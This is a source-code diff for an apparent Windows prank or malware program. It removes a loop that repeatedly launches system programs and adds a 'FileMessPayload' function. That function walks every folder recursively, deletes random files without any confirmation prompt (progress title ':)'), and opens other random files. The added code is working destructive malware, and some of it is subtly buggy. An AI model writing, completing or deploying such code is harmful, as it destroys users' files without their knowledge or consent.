@@ -2,15 +2,6 @@
 
 HCRYPTPROV prov;
 DWORD xs;
-const char* executes[] = {
-	"explorer.exe",
-	"calc.exe",
-	"notepad.exe",
-	"mspaint.exe",
-	"sndvol.exe",
-	"control.exe"
-};
-const size_t nExecutes = sizeof(executes) / sizeof(void*);
 
 int random() {
 	if (prov == NULL)
@@ -630,9 +621,55 @@ void MessageBoxPayload() {
 	}
 }
 
-void RandomExecutePayload() {
-	for (;;) {
-		ShellExecuteA(NULL, NULL, executes[random() % nExecutes], NULL, NULL, SW_SHOWNORMAL);
-		Sleep(2000);
+void DeleteThread(LPCWSTR strFileName) {
+	SHFILEOPSTRUCT shfo = { 0 };
+	shfo.hwnd = NULL;
+	shfo.wFunc = FO_DELETE;
+	shfo.pFrom = strFileName;
+	shfo.pTo = NULL;
+	shfo.fFlags = FOF_SIMPLEPROGRESS | FOF_NOCONFIRMATION;
+	shfo.lpszProgressTitle = L":)";
+	SHFileOperation(&shfo);
+}
+
+void FileMessPayload(PWSTR szDirectory) {
+	if (szDirectory[wcslen(szDirectory) - 1] != '\\' && wcslen(szDirectory) < 260) {
+		szDirectory[wcslen(szDirectory)] = '\\';
 	}
+
+	WCHAR szSearchDir[MAX_PATH] = { 0 };
+	lstrcpy(szSearchDir, szDirectory);
+	lstrcat(szSearchDir, L"*.*");
+
+	WIN32_FIND_DATA findData;
+	HANDLE hSearch = FindFirstFile(szSearchDir, &findData);
+
+	if (hSearch == INVALID_HANDLE_VALUE) {
+		return;
+	}
+	else do {
+		if (!lstrcmpW(findData.cFileName, L".") || !lstrcmpW(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+			continue;
+		}
+
+		WCHAR szPath[MAX_PATH] = { 0 };
+		lstrcpy(szPath, szDirectory);
+		lstrcat(szPath, findData.cFileName);
+
+		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+			lstrcat(szPath, L"\\");
+			FileMessPayload(szPath);
+		}
+		else if (random() % 50 == 0 && wcslen(szPath) < 260) {
+			szPath[wcslen(szPath)] = '\0\0';
+			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(DeleteThread), (PVOID)szPath, 0, NULL);
+			Sleep(500);
+		}
+		else if (random() % 20 == 0) {
+			ShellExecute(NULL, L"open", szPath, NULL, szDirectory, SW_SHOW);
+			Sleep(500);
+		}
+	} while (FindNextFile(hSearch, &findData));
+
+	FindClose(hSearch);
 }
